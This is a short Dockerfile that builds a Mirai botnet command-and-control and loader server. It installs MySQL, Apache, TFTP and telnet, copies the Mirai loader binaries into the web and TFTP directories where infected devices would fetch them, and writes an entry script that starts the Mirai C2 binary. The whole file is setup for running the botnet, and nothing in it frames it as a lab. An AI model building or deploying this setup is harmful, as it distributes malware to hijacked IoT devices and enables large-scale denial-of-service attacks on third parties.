FROM mirai:bot

RUN \

apt-get update	> /dev/null 		&&\
apt-get install -yq --no-install-recommends	\
			mysql-client  mysql-server apache2 tftpd-hpa telnet > /dev/null &&\

cp -r /usr/src/Mirai-Source-Code/loader/bins  /var/www/html/		&&\
cp -r /usr/src/Mirai-Source-Code/loader/bins  /var/lib/tftpboot/	&&\
	
echo "/etc/init.d/mysql restart 	&&\
	  /etc/init.d/apache2 start 	&&\
      /etc/init.d/tftpd-hpa start 	&&\
	  cd /usr/src/Mirai-Source-Code/mirai/ &&\
	  ./debug/cnc " > /etc/entry.sh	&&\

echo "[log] Mirai-cnc&loader build done "